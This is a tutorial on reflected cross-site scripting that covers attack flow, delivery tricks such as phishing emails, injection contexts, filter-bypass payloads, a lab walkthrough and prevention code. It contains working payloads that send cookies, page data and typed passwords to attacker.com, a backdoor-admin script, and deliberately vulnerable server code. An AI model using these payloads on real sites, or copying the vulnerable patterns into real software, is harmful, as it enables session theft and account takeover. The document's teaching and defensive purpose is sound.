# Reflected XSS

Reflected cross-site scripting (reflected XSS) is the most common type of XSS vulnerability, occurring when an application receives data in an HTTP request and immediately includes that data in the response without proper validation or encoding. Unlike stored XSS where malicious payloads persist in a database, reflected XSS is non-persistent—the malicious script travels from the attacker's crafted request through the server's response directly to the victim's browser. The attack requires social engineering to deliver the malicious URL to victims through phishing emails, malicious websites, social media messages, or forum posts. When a victim clicks the crafted link, their browser sends the request containing the payload to the vulnerable server, which reflects it back in the response, causing the victim's browser to execute the attacker's JavaScript within the trusted context of the vulnerable application's origin. This enables attackers to steal session cookies, capture keystrokes, perform unauthorized actions as the victim, access sensitive data visible to the user, and completely compromise the victim's interaction with the application.

The core vulnerability: **applications trust user input and embed it directly into HTTP responses without encoding**—data from the request becomes executable code in the response.

## What is Reflected XSS?

### Understanding reflected XSS

**Definition:** A web security vulnerability where user-supplied data from an HTTP request is immediately reflected back in the server's response without proper sanitization, allowing attackers to inject executable JavaScript.

**Key characteristics:**
- Non-persistent (doesn't get stored)
- Immediate reflection in response
- Requires victim to click malicious link
- Most common XSS type
- Travels: Request → Server → Response → Execution

**Attack flow diagram:**

```
Step 1: Attacker crafts malicious URL
https://victim-site.com/search?q=<script>steal_cookie()</script>

Step 2: Attacker delivers URL to victim
Via: Email, social media, malicious website, forum post

Step 3: Victim clicks the link
Browser sends HTTP request with payload in URL parameter

Step 4: Server processes request
Application receives q=<script>steal_cookie()</script>

Step 5: Server reflects payload in response
<p>You searched for: <script>steal_cookie()</script></p>

Step 6: Victim's browser receives response
Browser parses HTML and executes the injected script

Step 7: Malicious JavaScript runs
Executes with victim-site.com origin and victim's privileges

Step 8: Attacker achieves objective
Session cookie stolen, actions performed, data exfiltrated
```

### Simple reflected XSS example

**Vulnerable search functionality:**

**Server-side code (PHP):**
```php
<?php
// Vulnerable code - NO ENCODING
$searchTerm = $_GET['term'];
?>
<!DOCTYPE html>
<html>
<head><title>Search Results</title></head>
<body>
    <h1>Search Results</h1>
    <p>You searched for: <?php echo $searchTerm; ?></p>
    <div id="results">
        <!-- Search results would go here -->
    </div>
</body>
</html>
```

**Normal usage:**
```
Request:
GET /search?term=laptop HTTP/1.1
Host: vulnerable-shop.com

Response:
<p>You searched for: laptop</p>

Browser displays: You searched for: laptop
```

**Malicious usage:**
```
Request:
GET /search?term=<script>alert(document.domain)</script> HTTP/1.1
Host: vulnerable-shop.com

Response:
<p>You searched for: <script>alert(document.domain)</script></p>

Browser executes: alert(document.domain)
Alert shows: vulnerable-shop.com
```

**Real attack payload:**
```javascript
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**URL-encoded for delivery:**
```
https://vulnerable-shop.com/search?term=%3Cscript%3Efetch%28%27https%3A%2F%2Fattacker.com%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E
```

### Reflected vs. Stored XSS

**Critical differences:**

| Aspect | Reflected XSS | Stored XSS |
|--------|---------------|------------|
| **Persistence** | Non-persistent | Persistent (stored in database) |
| **Delivery** | Requires victim to click link | Automatic (just visit page) |
| **Social engineering** | Required | Not required |
| **Scope** | Individual victims who click | All users viewing affected page |
| **Severity** | Generally lower | Generally higher |
| **Detection** | Easier (visible in URL) | Harder (in database) |
| **Impact** | Limited to targeted users | Widespread (worm potential) |

**Reflected XSS attack chain:**
```
Attacker crafts URL → Sends to victim → Victim clicks → Executes once
                                          ↓
                              Only affects this victim
```

**Stored XSS attack chain:**
```
Attacker submits payload → Stored in database → All visitors affected
                                                         ↓
                                          Executes for every user
                                          Self-propagating potential
```

### Reflected vs. Self-XSS

**Self-XSS characteristics:**

**Definition:** XSS vulnerability that can only be triggered by the victim themselves entering malicious code, not through an attacker-controlled URL or external input.

**Self-XSS example:**
```
Scenario: Developer console social engineering

Attacker's instructions (via social media):
"Want free coins in this game? Open developer console (F12) 
and paste this code: 
document.location='https://attacker.com/steal?c='+document.cookie"

Victim must:
1. Open browser developer console (F12)
2. Paste attacker's code
3. Press Enter

Result: Session stolen, but requires significant victim action
```

**Comparison:**

```
Reflected XSS:
✓ Exploitable via crafted URL
✓ Victim just clicks link (normal behavior)
✓ Realistic attack vector
✓ Medium to high severity

Self-XSS:
✗ Cannot be triggered via URL
✗ Requires victim to paste code into console
✗ Requires technical knowledge from victim
✗ Heavy social engineering needed
✗ Low severity (not usually accepted by bug bounties)
```

**Why self-XSS is low severity:**
```
To exploit self-XSS, attacker must convince victim to:
1. Open developer tools (unusual for regular users)
2. Navigate to console tab
3. Paste unknown code
4. Execute it

This requires more social engineering than reflected XSS,
where victim just clicks a link (normal web behavior)
```

## Impact of Reflected XSS

### What attackers can do

**Complete user compromise:**

**1. Session hijacking:**
```html
<script>
// Steal session cookie
new Image().src = 'https://attacker.com/log?cookie=' + document.cookie;
</script>

Attacker gains:
- User's session token
- Can impersonate user
- Access account without password
```

**2. Action execution:**
```html
<script>
// Transfer money (banking app)
fetch('/api/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        to: 'attacker_account',
        amount: 5000
    })
});

// Change email (account takeover)
fetch('/api/account/email', {
    method: 'POST',
    body: 'email=attacker@evil.com'
});
</script>

Attacker can:
- Transfer funds
- Change account settings
- Make purchases
- Post content as user
- Send messages
```

**3. Data exfiltration:**
```html
<script>
// Read sensitive page content
const sensitiveData = {
    balance: document.querySelector('.account-balance').textContent,
    accountNumber: document.querySelector('.account-number').textContent,
    recentTransactions: document.querySelector('.transactions').innerHTML
};

// Send to attacker
fetch('https://attacker.com/exfiltrate', {
    method: 'POST',
    body: JSON.stringify(sensitiveData)
});
</script>

Attacker obtains:
- Account balances
- Transaction history
- Personal information
- Any data visible to user
```

**4. Credential capture:**
```html
<script>
// Inject fake login form
document.body.innerHTML = `
    <div style="text-align:center; margin-top:100px;">
        <h2>Session Expired</h2>
        <p>Please enter your password to continue</p>
        <form id="phish">
            <input type="password" placeholder="Password" id="pass">
            <button type="submit">Continue</button>
        </form>
    </div>
`;

document.getElementById('phish').onsubmit = function(e) {
    e.preventDefault();
    fetch('https://attacker.com/creds?p=' + document.getElementById('pass').value);
    alert('Verification failed. Please try again.');
    location.reload();
};
</script>

Attacker captures:
- User's password
- Can use for account access
- Can try on other services (credential reuse)
```

**5. Malware distribution:**
```html
<script>
// Redirect to exploit kit
if (navigator.platform.includes('Win')) {
    location.href = 'https://attacker.com/exploit-kit';
}

// Or trigger drive-by download
const a = document.createElement('a');
a.href = 'https://attacker.com/malware.exe';
a.download = 'important-update.exe';
a.click();
</script>

Results:
- Browser exploitation
- Malware installation
- System compromise
```

### Impact severity by application type

**Low-impact scenarios (brochureware):**
```
Public information website:
- No user accounts
- No sensitive data
- All content public

Reflected XSS impact:
- Limited damage potential
- Might deface page temporarily
- Could redirect users
- Severity: Low to Medium
```

**Medium-impact scenarios (social media):**
```
Social networking platform:
- User accounts exist
- Personal but not critical data
- Social interactions

Reflected XSS impact:
- Post spam/malicious content
- Send messages to contacts
- Steal personal information
- Damage reputation
- Severity: Medium to High
```

**High-impact scenarios (financial applications):**
```
Banking/financial services:
- Sensitive financial data
- Transaction capabilities
- High-value targets

Reflected XSS impact:
- Steal account credentials
- Transfer funds
- Access transaction history
- Identity theft
- Financial loss
- Severity: High to Critical
```

**Critical-impact scenarios (administrative access):**
```
Admin compromised:
- Elevated privileges
- Access to all user data
- System configuration access

Reflected XSS impact:
- Complete application takeover
- All users compromised
- Data breach
- System manipulation
- Severity: Critical
```

### Real-world impact example

**Scenario: E-commerce site administrator**

**Reflected XSS in admin search function:**
```php
// Admin panel search
<?php
$search = $_GET['query'];
echo "<h2>Search results for: $search</h2>";
?>
```

**Attack sequence:**

**Step 1: Attacker crafts payload:**
```html
<script>
// Enumerate all users
fetch('/admin/api/users')
    .then(r => r.json())
    .then(users => {
        // Exfiltrate to attacker
        fetch('https://attacker.com/dump', {
            method: 'POST',
            body: JSON.stringify(users)
        });
        
        // Create backdoor admin account
        fetch('/admin/api/users/create', {
            method: 'POST',
            body: JSON.stringify({
                username: 'backup_admin',
                password: 'P@ssw0rd123',
                role: 'administrator'
            })
        });
    });
</script>
```

**Step 2: Attacker sends link to admin:**
```
Email:
Subject: Urgent: Suspicious Order #XSS_PAYLOAD

Body:
"A suspicious order was flagged. Please search for order 
ID in admin panel:

https://shop.com/admin/search?query=<PAYLOAD_URL_ENCODED>

Urgent review required."
```

**Step 3: Admin clicks link (trusts internal system)**

**Step 4: Results:**
```
- All user data exfiltrated (names, emails, addresses, orders)
- Backdoor admin account created
- Attacker has persistent admin access
- Can access site anytime
- Potential data breach affecting thousands of customers
```

## Delivery Mechanisms for Reflected XSS

### Method 1: Phishing emails

**Example: Fake password reset**

```
From: security@victim-company.com (spoofed)
Subject: Urgent: Password Reset Required

Dear User,

We detected suspicious activity on your account. Please verify 
your identity by clicking the link below:

https://victim-company.com/verify?token=<script>steal()</script>

If you did not request this, please ignore this email.

Best regards,
Security Team
```

**Why it works:**
```
✓ Looks legitimate (spoofed sender)
✓ Creates urgency (suspicious activity)
✓ Uses real company domain
✓ URL starts with correct domain
✓ User clicks without inspecting full URL
```

### Method 2: Malicious website

**Attacker's site redirects:**

```html
<!-- attacker.com/redirect.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta http-equiv="refresh" 
          content="0; url=https://victim-site.com/search?q=<script>alert(1)</script>">
</head>
<body>
    <p>Loading...</p>
    <!-- Automatic redirect to vulnerable site with payload -->
</body>
</html>
```

**Or JavaScript redirect:**
```html
<script>
// Immediate redirect with payload
location.href = 'https://victim-site.com/page?param=<script>steal()</script>';
</script>
```

### Method 3: Forum/social media posts

**Malicious link in forum:**

```
Forum post:
"Check out this amazing deal I found!

https://legitimate-shop.com/product?id="><script>steal()</script>

Limited time only!"

Users click thinking it's a product link
```

**Shortened URLs (hide payload):**
```
Original malicious URL:
https://bank.com/search?q=<script>fetch('//attacker.com/s?c='+document.cookie)</script>

Shortened:
https://bit.ly/2xyz123

Users can't see payload before clicking
```

### Method 4: Search engine poisoning

**Attacker strategy:**

```
1. Create multiple pages linking to vulnerable URL with payload
2. Search engines index the malicious URLs
3. Users search Google for legitimate terms
4. Malicious result appears in search results
5. User clicks "legitimate" result
6. Payload executes

Example poisoned search result:
Title: "Official Bank Login"
URL: bank.com/login?redirect=<payload>
Snippet: "Access your account securely..."
```

### Method 5: Ad networks

**Malicious advertisement:**

```html
<!-- Ad creative contains redirect -->
<a href="https://victim-site.com/promo?source=<script>payload</script>">
    <img src="attractive-offer.jpg" alt="Click here!">
</a>

When user clicks ad:
1. Redirects to victim-site.com
2. Carries XSS payload
3. Executes in victim's browser
```

### Method 6: Open redirect chains

**Combining vulnerabilities:**

```
Trusted site has open redirect:
https://trusted-site.com/redirect?url=ATTACKER_URL

Attacker uses to redirect to XSS:
https://trusted-site.com/redirect?url=https://victim-site.com/page?xss=PAYLOAD

Attack chain:
1. Email contains trusted-site.com link (looks safe)
2. Trusted-site redirects to victim-site
3. victim-site reflects XSS payload
4. Payload executes

Bypasses user suspicion (trusted domain in email)
```

### Method 7: QR codes

**Physical/digital distribution:**

```
Attacker creates QR code encoding:
https://company.com/login?next=<script>payload</script>

Distribution:
- Print on flyers
- Display in public places
- Send in emails/messages
- Post on social media

User scans QR code:
- Phone camera doesn't show full URL
- Automatically opens browser
- Payload executes
```

## Reflected XSS in Different Contexts

### Context 1: HTML element context

**Between HTML tags:**

```html
<!-- Server reflects input here -->
<p>You searched for: USER_INPUT</p>
<div>Welcome, USER_INPUT!</div>
<span>Status: USER_INPUT</span>
```

**Standard exploitation:**

**Test payload:**
```html
<script>alert(document.domain)</script>
```

**Request:**
```
GET /search?term=<script>alert(document.domain)</script> HTTP/1.1
```

**Response:**
```html
<p>You searched for: <script>alert(document.domain)</script></p>
```

**Result:** Script executes, alert appears.

**Alternative payloads (if `<script>` filtered):**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
```

### Context 2: Attribute value (quoted)

**Inside HTML attribute:**

```html
<!-- Input reflected in attribute -->
<input type="text" value="USER_INPUT">
<img src="image.jpg" alt="USER_INPUT">
<a href="/page" title="USER_INPUT">
```

**Breaking out of attribute:**

**Vulnerable code:**
```php
<input value="<?php echo $_GET['name']; ?>">
```

**Payload 1: Close quote and add event handler**
```html
" onclick="alert(1)
```

**Result:**
```html
<input value="" onclick="alert(1)">
```

**Payload 2: Close tag and inject new tag**
```html
"><script>alert(1)</script>
```

**Result:**
```html
<input value=""><script>alert(1)</script>">
```

**Payload 3: Event handler with automatic trigger**
```html
" autofocus onfocus="alert(1)
```

**Result:**
```html
<input value="" autofocus onfocus="alert(1)">
```

### Context 3: Attribute value (unquoted)

**No quotes around attribute value:**

```html
<input value=USER_INPUT>
<div class=USER_INPUT>
```

**Exploitation (easier - no quotes to close):**

**Payload:**
```html
x onclick=alert(1)
```

**Result:**
```html
<input value=x onclick=alert(1)>
```

**Payload with auto-trigger:**
```html
x autofocus onfocus=alert(1)
```

**Result:**
```html
<input value=x autofocus onfocus=alert(1)>
```

### Context 4: JavaScript string

**Inside script tags:**

```html
<script>
var searchTerm = 'USER_INPUT';
var username = "USER_INPUT";
</script>
```

**Breaking out of single quotes:**

**Vulnerable code:**
```javascript
<script>
var search = '<?php echo $_GET['q']; ?>';
</script>
```

**Payload:**
```javascript
';alert(document.domain);//
```

**Result:**
```javascript
<script>
var search = '';alert(document.domain);//';
</script>
```

**Breaking out of double quotes:**

**Payload:**
```javascript
";alert(1);//
```

**Result:**
```javascript
<script>
var search = "";alert(1);//";
</script>
```

**Multi-line break:**

**Payload:**
```javascript
test'
alert(1)
var x='
```

**Result:**
```javascript
<script>
var search = 'test'
alert(1)
var x='';
</script>
```

### Context 5: JavaScript template literals

**Inside backticks:**

```html
<script>
var message = `Welcome, USER_INPUT`;
</script>
```

**Template literal injection:**

**Payload:**
```javascript
${alert(1)}
```

**Result:**
```javascript
<script>
var message = `Welcome, ${alert(1)}`;
</script>
```

**Expression executes within template literal.**

### Context 6: Event handler attribute

**Already inside event handler:**

```html
<a href="#" onclick="displayName('USER_INPUT')">
<button onmouseover="showTip('USER_INPUT')">
```

**Breaking out of function call:**

**Payload:**
```javascript
'); alert(1);//
```

**Result:**
```html
<a href="#" onclick="displayName(''); alert(1);//')">
```

### Context 7: href/src attributes

**URL attributes:**

```html
<a href="USER_INPUT">Link</a>
<iframe src="USER_INPUT">
<img src="USER_INPUT">
```

**JavaScript protocol:**

**Payload:**
```javascript
javascript:alert(document.domain)
```

**Result:**
```html
<a href="javascript:alert(document.domain)">Link</a>
```

**When user clicks, JavaScript executes.**

**Data URI:**
```html
data:text/html,<script>alert(1)</script>
```

**Base64 data URI:**
```html
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Context 8: CSS context

**Style attribute:**

```html
<div style="background: USER_INPUT">
```

**Limited exploitation:**

**Payload (breaking out):**
```css
red; }</style><script>alert(1)</script><style>
```

**Result:**
```html
<div style="background: red; }</style><script>alert(1)</script><style>">
```

## How to Find Reflected XSS

### Automated scanning

**Burp Suite Web Vulnerability Scanner:**

```
Features:
✓ Automated XSS detection
✓ Tests all parameters
✓ Context-aware payloads
✓ High accuracy
✓ Reports with PoC

Usage:
1. Proxy traffic through Burp
2. Right-click request → Scan
3. Or: Dashboard → New Scan → Select target
4. Review findings in Issues tab
```

**OWASP ZAP:**
```
Features:
✓ Free and open-source
✓ Automated spider + scanner
✓ XSS detection
✓ Active and passive scanning

Usage:
1. Set browser proxy to ZAP
2. Navigate application
3. Attack → Active Scan
4. Review Alerts
```

### Manual testing methodology

**Step 1: Test every entry point**

**Identify all input points:**

```
URL parameters:
/search?q=TEST
/product?id=TEST
/profile?user=TEST

POST data:
name=TEST&email=TEST&comment=TEST

HTTP headers:
User-Agent: TEST
Referer: TEST
X-Forwarded-For: TEST

URL path:
/page/TEST/view
/category/TEST

Cookies:
tracking=TEST
```

**Step 2: Submit unique random values**

**Generate unique identifier:**

```
Format: xss_[location]_[random]

Examples:
URL param 'q': xss_q_h8g2k9
POST field 'name': xss_name_p3x7m1
Header 'User-Agent': xss_ua_r4j9s2

Why unique?
- Prevents false positives
- Tracks specific injection point
- 8 characters is ideal length
- Alphanumeric survives most validation
```

**Burp Intruder automation:**

```
1. Send request to Intruder
2. Add position markers: §§
3. Payload type: Numbers
4. Number format: Hex
5. Payload processing: Add prefix "xss_"
6. Grep - Match: Add "xss_"
7. Start attack
8. Review responses containing "xss_"
```

**Step 3: Determine reflection context**

**Search response for your unique value:**

```
Browser DevTools:
1. Open page source (Ctrl+U)
2. Search for: xss_q_h8g2k9 (Ctrl+F)
3. Note every location found

Burp Suite:
1. Response tab
2. Search (Ctrl+F)
3. Highlight all matches

Contexts to identify:
□ Between HTML tags: <div>xss_q_h8g2k9</div>
□ In attribute: <input value="xss_q_h8g2k9">
□ In JavaScript: var x = "xss_q_h8g2k9";
□ In URL: <a href="/page?ref=xss_q_h8g2k9">
□ In CSS: style="color: xss_q_h8g2k9"
□ Multiple locations (test each separately)
```

**Step 4: Test candidate payload**

**Context-specific payloads:**

**HTML element context:**
```html
Original: <div>xss_test_123</div>

Payload: <script>alert(1)</script>

Test: Replace xss_test_123 with payload
Request: /page?param=<script>alert(1)</script>

Expected: <div><script>alert(1)</script></div>
```

**Quoted attribute context:**
```html
Original: <input value="xss_test_123">

Payload: "><script>alert(1)</script>

Test: /page?param="><script>alert(1)</script>

Expected: <input value=""><script>alert(1)</script>">
```

**JavaScript string context:**
```javascript
Original: var x = "xss_test_123";

Payload: ";alert(1);//

Test: /page?param=";alert(1);//

Expected: var x = "";alert(1);//";
```

**Burp Repeater workflow:**

```
1. Send request to Repeater (Ctrl+R)
2. Keep original random value: xss_test_123
3. Add payload before it: <script>alert(1)</script>xss_test_123
4. Send request
5. Search response for: xss_test_123
6. Burp highlights location
7. Inspect payload rendering around highlighted area
8. Determine if payload executed or was modified
```

**Step 5: Test alternative payloads**

**If initial payload fails, try alternatives:**

**Blocked: `<script>`**
```html
Try:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

**Blocked: `alert`**
```javascript
Try:
(alert)(1)
window['al'+'ert'](1)
eval('al'+'ert(1)')
confirm(1)
prompt(1)
```

**Blocked: `(` `)` parentheses**
```javascript
Try:
<svg onload=alert`1`>
throw onerror=alert,'1'
```

**Blocked: quotes**
```javascript
Try:
alert`1`
String.fromCharCode(88,83,83)
\x61lert\x281\x29
```

**Step 6: Test in browser**

**Final verification:**

```
1. Craft final exploit URL
2. Copy URL from Burp Repeater or construct manually
3. Open new browser tab (or incognito)
4. Paste URL into address bar
5. Press Enter
6. Observe if JavaScript executes

Success indicators:
✓ Alert dialog appears
✓ Console shows output
✓ Network tab shows exfiltration request
✓ Page behavior changes as expected

Note: Some payloads work in Burp but not browser due to:
- Browser XSS filters (legacy)
- Browser encoding handling
- JavaScript execution context
Always verify in actual browser
```

### Advanced testing techniques

**Testing HTTP headers:**

```http
GET /page HTTP/1.1
Host: victim-site.com
User-Agent: <script>alert(1)</script>
Referer: https://attacker.com/<script>alert(1)</script>
X-Forwarded-For: <script>alert(1)</script>
Cookie: tracking=<script>alert(1)</script>

Check if reflected in:
- Error messages
- Logs (if displayed to users/admins)
- Diagnostic pages
- Headers echoed in response
```

**Testing URL path:**

```
Normal: /category/electronics
Test: /category/<script>alert(1)</script>

Some applications reflect path in:
- Breadcrumbs
- Error messages ("Page /category/... not found")
- Navigation elements
```

**Testing POST data:**

```http
POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=<script>alert(1)</script>&email=test@test.com&comment=Test

Check if name reflected in:
- Confirmation message
- Preview
- Error message
```

**Testing JSON endpoints:**

```http
POST /api/search HTTP/1.1
Content-Type: application/json

{"query": "<script>alert(1)</script>"}

Response:
{"results": [], "searchTerm": "<script>alert(1)</script>"}

If rendered in HTML without encoding → XSS
```

## Lab Walkthrough: Reflected XSS into HTML context with nothing encoded

**Scenario:** Basic search functionality with zero filtering

**Objective:** Trigger an alert dialog in the victim's browser

**Step 1: Identify the search functionality**

```
Application has search box on homepage
URL pattern: /search?term=
Enter normal search: "laptop"
Observe behavior
```

**Step 2: Test for reflection**

```http
GET /search?term=teststring12345 HTTP/1.1
Host: lab-id.web-security-academy.net

Response contains:
<h1>0 search results for 'teststring12345'</h1>
<div class="container">
    <p>Your search - teststring12345 - did not match any products.</p>
</div>
```

**Analysis:**
```
✓ Input reflected in two locations
✓ Between HTML tags (not in attributes)
✓ No obvious filtering
✓ Context: HTML element
```

**Step 3: Test basic script injection**

```http
GET /search?term=<script>alert(1)</script> HTTP/1.1

Response:
<h1>0 search results for '<script>alert(1)</script>'</h1>
<div class="container">
    <p>Your search - <script>alert(1)</script> - did not match any products.</p>
</div>
```

**In browser:**
```
Alert dialog appears with "1"
JavaScript execution confirmed!
```

**Step 4: Complete the lab with PortSwigger's required payload**

```html
Payload: <script>alert(1)</script>

URL:
https://lab-id.web-security-academy.net/search?term=<script>alert(1)</script>

Or URL-encoded:
https://lab-id.web-security-academy.net/search?term=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

**Step 5: Lab completion**

```
✓ Alert triggered
✓ Lab marked as "Solved"
✓ Congratulations message appears
```

**Real-world exploitation example:**

**Instead of alert(1), use data exfiltration:**
```html
<script>
fetch('https://exploit-server.net/steal?cookie=' + document.cookie);
</script>

URL-encoded:
%3Cscript%3Efetch%28%27https%3A%2F%2Fexploit-server.net%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E

Send to victim:
https://lab-id.web-security-academy.net/search?term=PAYLOAD_HERE

Victim clicks → Cookie sent to attacker
```

## Common Reflected XSS Patterns

### Pattern 1: Search functionality

**Vulnerable code:**
```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = database.search(query)
    return f'<h1>Results for: {query}</h1>{render_results(results)}'
```

**Exploitation:**
```
/search?q=<script>alert(1)</script>
```

### Pattern 2: Error messages

**Vulnerable code:**
```java
@RequestMapping("/item")
public String getItem(@RequestParam String id) {
    Item item = itemRepository.findById(id);
    if (item == null) {
        return "<h1>Error</h1><p>Item '" + id + "' not found</p>";
    }
    return renderItem(item);
}
```

**Exploitation:**
```
/item?id=<script>alert(1)</script>
```

### Pattern 3: Tracking/referrer display

**Vulnerable code:**
```javascript
app.get('/page', (req, res) => {
    const referer = req.query.ref || 'direct';
    res.send(`
        <p>You came from: ${referer}</p>
        <script>trackReferrer('${referer}');</script>
    `);
});
```

**Exploitation:**
```
/page?ref=');alert(1);//
```

### Pattern 4: Username/profile display

**Vulnerable code:**
```php
<?php
$username = $_GET['user'];
echo "<h1>Profile not found for: $username</h1>";
?>
```

**Exploitation:**
```
/profile?user=<img src=x onerror=alert(1)>
```

### Pattern 5: Redirect pages

**Vulnerable code:**
```ruby
get '/redirect' do
  url = params[:url]
  erb "<p>Redirecting to #{url}...</p><script>setTimeout(function(){ location='#{url}'; }, 2000);</script>"
end
```

**Exploitation:**
```
/redirect?url=javascript:alert(1)
```

## Prevention Strategies

### Primary defense: Output encoding

**Context-aware encoding is critical:**

**HTML context encoding (PHP):**
```php
<?php
$userInput = $_GET['search'];
// Encode for HTML context
$safe = htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, 'UTF-8');
?>
<p>You searched for: <?php echo $safe; ?></p>
```

**JavaScript context encoding (Node.js):**
```javascript
function escapeJavaScript(str) {
    return str
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r')
        .replace(/</g, '\\x3c')
        .replace(/>/g, '\\x3e');
}

const userInput = req.query.search;
const safe = escapeJavaScript(userInput);
res.send(`<script>var search = '${safe}';</script>`);
```

**URL context encoding (Python):**
```python
from urllib.parse import quote

user_input = request.args.get('query')
safe_url = quote(user_input, safe='')
return f'<a href="/search?q={safe_url}">Search</a>'
```

### Secondary defense: Input validation

**Allowlist validation:**
```javascript
function validateSearchTerm(input) {
    // Only allow alphanumeric, spaces, and common punctuation
    const pattern = /^[a-zA-Z0-9\s\.,!?-]{1,100}$/;
    
    if (!pattern.test(input)) {
        throw new Error('Invalid search term');
    }
    
    return input;
}
```

**Type validation:**
```python
def validate_product_id(id_str):
    try:
        product_id = int(id_str)
        if product_id < 1:
            raise ValueError
        return product_id
    except ValueError:
        raise ValueError("Invalid product ID")
```

### Tertiary defense: Content Security Policy

**Implement CSP headers:**
```javascript
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; " +
        "script-src 'self'; " +
        "object-src 'none'; " +
        "base-uri 'self';"
    );
    next();
});
```

### Complete secure implementation

```javascript
const express = require('express');
const helmet = require('helmet');
const app = express();

// 1. Security headers
app.use(helmet());

// 2. CSP
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self'; object-src 'none';"
    );
    next();
});

// 3. HTML encoding function
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// 4. Input validation
function validateSearchTerm(input) {
    if (typeof input !== 'string' || input.length > 100) {
        throw new Error('Invalid input');
    }
    return input;
}

// 5. Secure endpoint
app.get('/search', (req, res) => {
    try {
        // Validate
        const searchTerm = validateSearchTerm(req.query.term || '');
        
        // Perform search
        const results = performSearch(searchTerm);
        
        // Encode for output
        const safeTerm = escapeHtml(searchTerm);
        
        // Render safely
        res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>Search Results</title></head>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: ${safeTerm}</p>
                <div id="results">
                    ${results.map(r => `<div>${escapeHtml(r.title)}</div>`).join('')}
                </div>
            </body>
            </html>
        `);
    } catch (err) {
        res.status(400).send('Invalid search term');
    }
});

app.listen(3000);
```
